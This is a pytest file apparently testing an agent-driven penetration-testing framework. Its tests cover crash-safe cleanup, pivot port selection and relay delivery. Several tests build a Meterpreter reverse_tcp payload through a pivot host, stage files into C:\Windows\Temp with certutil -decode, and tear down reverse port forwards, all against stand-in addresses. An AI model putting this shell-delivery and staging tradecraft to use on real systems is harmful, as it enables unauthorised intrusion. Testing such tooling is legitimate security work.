"""Offline walk tests use model choices and keep fact evidence separate from step reports."""

import sys
from pathlib import Path
import json
from copy import deepcopy
from uuid import uuid4

import pytest
from unittest.mock import create_autospec


from orchestration import delivery_setup  # noqa: E402
from agents.planner import service as planning  # noqa: E402
from orchestration import positions  # noqa: E402
from agents.verifier import service  # noqa: E402
from orchestration import session_flow  # noqa: E402
from orchestration import walk as walk_mod  # noqa: E402
from tests.test_run_plan_support import ROOT
for extra in (ROOT / "src", ROOT / "scripts"):
    if str(extra) not in sys.path:
        sys.path.insert(0, str(extra))

import run_plan                                              # noqa: E402
import run_lean_task                                         # noqa: E402
from tests.support import stub_callers                       # noqa: E402
from agents._model import client as model_mod                        # noqa: E402
from graph import rehydrate                                  # noqa: E402
from orchestration import graph_view, evidence
from agents.planner import service as planning     # noqa: E402
from orchestration import positions as positions_mod  # noqa: E402
from orchestration import preparation, reporting  # noqa: E402
from orchestration import session_flow                       # noqa: E402
from orchestration.graph_view import graph_nodes, needs      # noqa: E402
from agents.planner.service import (                         # noqa: E402
    choice_refusal,
    next_node,
    plan_next,
)
from orchestration.verification import assessment
from agents.verifier import backstops, service  # noqa: E402
from runtime import delivery_commands, dispatch               # noqa: E402
from runtime import session_delivery, session_registry        # noqa: E402
from runtime import credentials                              # noqa: E402
from runtime import session_io                               # noqa: E402
from runtime import session_resources, sessions               # noqa: E402
from skills import bind                                       # noqa: E402

from tests.test_run_plan_support import delivery_fixture


def test_reclaim_recovers_delivery_after_the_preparer_exits(tmp_path, monkeypatch):
    """A persisted plan permits cleanup after a crash without replaying preparation."""
    import reclaim
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    working = dispatch.invoke
    def crash(request, **kwargs):
        calls.append("prepare interrupted")
        raise SystemExit("simulated process exit")
    monkeypatch.setattr(dispatch, "invoke", crash)
    with pytest.raises(SystemExit):
        session_delivery.begin_session_delivery(**arguments)
    monkeypatch.setattr(dispatch, "invoke", working)
    results = reclaim.reclaim_delivery_plans(tmp_path, executor=None, apply=True)
    assert len(results) == 1 and results[0]["state"] == "completed"
    assert calls == ["prepare interrupted", "echo cleanup"]
    stored = json.loads(next((tmp_path / "delivery").glob("*/plan.json")).read_text())
    assert stored["state"] == "cleaned"


def test_unconfirmed_cleanup_is_never_replayed(tmp_path, monkeypatch):
    """Unconfirmed cleanup retains the lease and cannot be retried merely by invoking reclaim again."""
    from runtime.runner import ExecOutcome
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    plan = session_delivery.begin_session_delivery(**arguments)
    def unconfirmed(request, **kwargs):
        calls.append("cleanup unconfirmed")
        return ExecOutcome(None, stdout="partial", timed_out=True, read_stop="deadline")
    monkeypatch.setattr(dispatch, "invoke", unconfirmed)
    first = session_delivery.cancel_session_delivery(executor=None, plan=plan, rpc_conf={}, root=tmp_path)
    monkeypatch.setattr(dispatch, "invoke",
                        lambda *a, **k: pytest.fail("an unsettled cleanup must not be replayed"))
    second = session_delivery.cancel_session_delivery(executor=None, plan={"owner": plan["owner"]},
                                              rpc_conf={}, root=tmp_path)
    assert first["state"] == second["state"] == "unknown"
    assert "SESSION_DELIVERY_CALL_UNRESOLVED" in second["reason"]
    state = json.loads((session_registry._resource_root(tmp_path) / "sessions.json").read_text())
    assert state["resources"] and calls == ["echo prepare", "cleanup unconfirmed"]


def test_cleanup_reconciles_a_crash_after_resource_release(tmp_path, monkeypatch):
    """A registered cleanup receipt and release survive a later plan-write failure without another command."""
    arguments, calls = delivery_fixture(tmp_path, monkeypatch)
    plan = session_delivery.begin_session_delivery(**arguments)
    save = session_delivery._save_delivery_plan
    def interrupted(root, value):
        if value.get("state") == "cleaned":
            raise OSError("simulated plan-write interruption")
        return save(root, value)
    monkeypatch.setattr(session_delivery, "_save_delivery_plan", interrupted)
    first = session_delivery.cancel_session_delivery(executor=None, plan=plan, rpc_conf={}, root=tmp_path)
    assert first["state"] == "unknown"
    monkeypatch.setattr(session_delivery, "_save_delivery_plan", save)
    second = session_delivery.cancel_session_delivery(executor=None, plan={"owner": plan["owner"]},
                                              rpc_conf={}, root=tmp_path)
    assert second["state"] == "completed" and calls == ["echo prepare", "echo cleanup"]


def test_reclaim_stops_before_terminating_an_unsettled_carrier(tmp_path, monkeypatch):
    """Failed delivery cleanup leaves its carrier available for reconciliation and returns a named failure."""
    import reclaim
    monkeypatch.setattr(reclaim, "reclaim_delivery_plans", lambda *a, **k: [
        {"state": "unknown", "reason": "SESSION_DELIVERY_CALL_UNRESOLVED"}])
    monkeypatch.setattr(reclaim, "stop_framework",
                        lambda *a, **k: pytest.fail("unsettled cleanup must retain its carrier"))
    assert reclaim.main(["--ledger", str(tmp_path), "--apply"]) == 2


def test_a_relay_delivery_names_the_pivot_address_the_ports_and_both_paths():
    """跨网段交付：助手程序指向**跳板面向目标网的地址**，会话字段与直连同形。

    2026-10-08 真机实测：经跳板回连的会话是 `session_host=<目标>` + `tunnel_local=<控制端:handler>`，
    所以期望字段照直连写；跳板侧监听口与控制端 handler 口分别占用、分别记账。
    """
    spec = {"driver": "msf", "via": "relay", "transport": "relay",
            "payload": {"path": "windows/x64/meterpreter/reverse_tcp", "kind": "meterpreter",
                        "format": "exe"},
            "remote": {"dir": "C:\\Windows\\Temp", "suffix": ".exe"}}
    built = delivery_commands.relay_delivery_declaration(
        spec=spec, control="198.51.100.19", target_host="192.0.2.30", pivot="192.0.2.20",
        pivot_port=2090, handler_port=1090, materials_dir="/tmp/agv-materials", nonce="feedface",
        remote_dir="C:\\Windows\\Temp", suffix=".exe")
    assert built["expected"] == {"session_host": "192.0.2.30",
                                 "tunnel_local": "198.51.100.19:1090", "type": "meterpreter"}
    assert {"host": "192.0.2.20", "port": 2090, "protocol": "tcp"} in built["resources"]
    assert {"host": "198.51.100.19", "port": 1090, "protocol": "tcp"} in built["resources"]
    command = built["prepare"][0]["request"]["cmd"]
    assert "LHOST=192.0.2.20" in command and "LPORT=2090" in command
    assert built["materials"]["remote_stager"] == "C:\\Windows\\Temp\\agv_feedface.exe"
    assert built["materials"]["stager"] == "/tmp/agv-materials/agv_feedface.bin"
    assert built["command"].strip()


def test_the_pivot_port_skips_what_the_pivot_already_listens_on(monkeypatch):
    """跳板侧端口只在**它自己没被占**的时候才用；挑不到就具名拒绝，不硬上。"""
    from runtime import session_registry, sessions
    from types import SimpleNamespace

    seen = []

    def call(binding, request, timeout):
        seen.append(request["cmd"])
        text = "TCP 0.0.0.0:2090 LISTENING\n" if "2090" in request["cmd"] else ""
        outcome = SimpleNamespace(stdout=text, stderr="", returncode=0, timed_out=False,
                                  tool_error=None, read_stop="end_marker")
        return {"outcome": outcome, "confirmed": True, "command_rc": 0}

    monkeypatch.setattr(session_io, 'call_bound', call)
    assert session_resources.free_pivot_port({"kind": "console_session"}, band=(2090, 2092)) == 2091
    assert seen and all("netstat" in item for item in seen)

    def busy(binding, request, timeout):
        outcome = SimpleNamespace(stdout="TCP 0.0.0.0:2090 LISTENING", stderr="", returncode=0,
                                  timed_out=False, tool_error=None, read_stop="end_marker")
        return {"outcome": outcome, "confirmed": True, "command_rc": 0}

    monkeypatch.setattr(session_io, 'call_bound', busy)
    assert session_resources.free_pivot_port({"kind": "console_session"}, band=(2090, 2092)) == 0


def test_a_held_lease_keeps_the_next_plan_off_that_port(monkeypatch):
    """Free on the pivot is not free: a lease another plan still holds must be skipped."""
    from runtime import session_registry, sessions
    from types import SimpleNamespace

    seen = []

    def call(binding, request, timeout):
        seen.append(request["cmd"])
        outcome = SimpleNamespace(stdout="", stderr="", returncode=0, timed_out=False,
                                  tool_error=None, read_stop="end_marker")
        return {"outcome": outcome, "confirmed": True, "command_rc": 0}

    monkeypatch.setattr(session_io, 'call_bound', call)
    chosen = session_resources.free_pivot_port({"kind": "console_session"}, band=(2090, 2092),
                                      taken=[2090])
    assert chosen == 2091
    assert all(":2090 " not in item for item in seen)


def test_staging_into_a_console_checks_the_decoded_size_not_a_localised_message(tmp_path,
                                                                               monkeypatch):
    """装没装上按**文件大小**核对：真机那句提示是本地化的，按英文词判会把装好的判没装。"""
    from runtime import session_registry, sessions
    from types import SimpleNamespace

    source = tmp_path / "stager.bin"
    source.write_bytes(b"x" * 7168)
    calls = []

    class Executor:
        def __call__(self, argv, timeout):
            if "wc -c" in " ".join(argv):
                return SimpleNamespace(stdout="7168\n", stderr="", returncode=0)
            return SimpleNamespace(stdout="eA==\n", stderr="", returncode=0)

    def call(binding, request, timeout):
        calls.append(request["cmd"])
        text = "AGVSIZE=7168" if "%~zI" in request["cmd"] else ""
        outcome = SimpleNamespace(stdout=text, stderr="", returncode=0, timed_out=False,
                                  tool_error=None, read_stop="end_marker")
        return {"outcome": outcome, "confirmed": True, "command_rc": 0}

    monkeypatch.setattr(session_io, 'call_bound', call)
    staged = session_flow.stage_file_into_console(
        Executor(), {"kind": "console_session"}, source=str(source),
        remote="C:\\Windows\\Temp\\agv_x.exe", chunk=4000)
    assert staged["remote"].endswith("agv_x.exe") and staged["chunks"] >= 1
    assert any("certutil -decode" in item for item in calls)

    def short(binding, request, timeout):
        outcome = SimpleNamespace(stdout="AGVSIZE=7", stderr="", returncode=0, timed_out=False,
                                  tool_error=None, read_stop="end_marker")
        return {"outcome": outcome, "confirmed": True, "command_rc": 0}

    monkeypatch.setattr(session_io, 'call_bound', short)
    with pytest.raises(ValueError, match="^STAGE_FILE_DECODE_UNCONFIRMED"):
        session_flow.stage_file_into_console(
            Executor(), {"kind": "console_session"}, source=str(source),
            remote="C:\\Windows\\Temp\\agv_x.exe", chunk=4000)


def test_a_failed_relay_hand_over_releases_only_what_it_owns(monkeypatch):
    """撤只撤本次装的那条回程门与送上跳板的那份文件，且**每一步各自留回执**。"""
    from runtime import session_registry, sessions
    from types import SimpleNamespace

    listing = ("\nActive Port Forwards\n====================\n\n"
               "   Index  Local                Remote     Direction\n"
               "   1      192.0.2.9:1090       [::]:2090  Reverse\n")
    calls = []

    def call(binding, request, timeout):
        calls.append(request)
        text = listing if str(request.get("cmd") or "").startswith("portfwd list") else "cleaned"
        outcome = SimpleNamespace(stdout=text, stderr="", returncode=0, timed_out=False,
                                  tool_error=None, read_stop="end_marker")
        return {"outcome": outcome, "confirmed": True, "command_rc": 0}

    monkeypatch.setattr(session_io, "call_bound", call)
    receipts = session_delivery.undo_relay_delivery(
        {"kind": "console_session", "session_type": "meterpreter"},
        {"pivot_port": 2090, "remote_stager": "C:\\Windows\\Temp\\agv_x.exe"})
    assert [row["step"] for row in receipts] == ["portfwd-delete", "pivot-file"]
    assert all(row["confirmed"] for row in receipts)
    assert any("portfwd delete -i 1" in str(item.get("cmd")) for item in calls)
    assert any("del C:\\Windows\\Temp\\agv_x.exe" in str(item.get("cmd")) for item in calls)
